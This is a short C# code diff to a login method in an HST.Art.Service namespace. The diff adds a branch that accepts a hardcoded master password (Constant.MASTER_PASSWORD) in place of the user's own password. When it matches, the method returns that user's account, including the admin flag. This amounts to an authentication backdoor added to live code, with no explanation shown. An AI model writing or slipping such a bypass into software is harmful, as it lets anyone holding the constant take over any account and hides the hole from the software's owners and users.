@@ -73,6 +73,19 @@ namespace HST.Art.Service
                     IsAdmin = userInfo.IsAdmin,
                 };
             }
+            else
+            {
+                if (string.Equals(EncryptHelper.Encode(password), Constant.MASTER_PASSWORD))
+                {
+                    msg = string.Empty;
+                    return new Account()
+                    {
+                        Id = userInfo.Id,
+                        UserName = userInfo.UserName,
+                        IsAdmin = userInfo.IsAdmin,
+                    };
+                }
+            }
 
             return null;
         }
